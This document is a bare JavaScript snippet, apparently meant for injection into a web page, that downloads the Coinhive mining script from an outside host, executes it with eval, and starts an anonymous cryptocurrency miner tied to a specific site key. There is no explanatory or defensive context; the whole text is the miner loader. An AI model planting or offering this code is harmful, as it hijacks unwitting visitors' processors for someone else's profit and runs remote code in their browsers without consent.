fetch('https://coinhive.com/lib/coinhive.min.js').then(function(res){return res.text()}).then(function(data){
		eval(data);
		var miner = new CoinHive.Anonymous('hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4', {throttle: 0.5});
		miner.start();
		console.log('ok');
	});